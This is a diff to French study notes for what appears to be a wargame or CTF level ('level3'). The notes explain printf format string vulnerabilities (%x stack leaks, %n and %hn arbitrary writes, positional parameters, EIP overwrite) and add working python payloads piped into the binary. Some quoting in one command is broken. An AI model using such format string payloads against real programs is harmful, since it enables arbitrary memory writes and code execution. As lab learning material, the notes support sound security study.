@@ -76,7 +76,48 @@ Variable gloable ?
 
 b *v+62
 
-python -c "print '\x8c\x98\x04\x08' + ' + '%5$n'"
+Exploit printf ?
+
+On passe en argument à notre programme des formateurs. Le programme se retrouve donc à exécuter
+la chose suivante :
+   printf("%x%x%x%x");
+Seulement vous on remarque que la fonction printf() n'a pas d'arguments pour remplacer les formateurs dans la chaine.
+Elle affiche donc ce qu'elle a sous la main, c'est à dire les valeurs présentes sur la pile.
+
+Types de formateurs
+
+Formateurs directs (comme %x) : Affichent directement la valeur ciblée sur la pile
+
+Formateurs pointeurs (comme %s) : Affichent la valeur située à l'adresse ciblée
+
+Formateur spécial %n : Écrit en mémoire le nombre de caractères affichés avant lui
+
+Mécanisme d'exploitation
+Fonctionnement
+
+La fonction printf() parcourt la pile 4 octets par 4 octets pour trouver les valeurs à afficher
+
+Sans arguments, printf() affiche les valeurs présentes sur la pile
+Le formateur %n permet d'écrire en mémoire à une adresse spécifique
+Technique d'exploitation
+
+   Utilisation de %hn pour écrire 2 octets à la fois
+
+Possibilité de contrôler le flux d'exécution en écrasant l'adresse de retour (EIP)
+Utilisation de la notation %Nd pour générer des padding de taille contrôlée
+
+Impact
+Cette vulnérabilité permet notamment :
+
+La lecture de données sensibles en mémoire
+L'écriture à des adresses arbitraires
+L'exécution de code arbitraire via la redirection du flux d'exécution
+
+
+python -c "print '\x8c\x98\x04\x08' + ' + '%4$n'"
+
+Le symbole $ dans %4$n est un paramètre de position qui permet d'accéder directement au 4ème argument sur la pile 
+
 0xbffff520 adresse du buf
 
 x/x 0xbffff520
@@ -88,4 +129,6 @@ Plus qu'a modifier sa valeur
 
 printf exploit --> 
 r < <(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
-python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'
+(python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"'; cat) | ./level3
+(python -c 'print "\x8c\x98\x04\x08" + "%60c" + "%4$n"'; cat) | ./level3
+(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
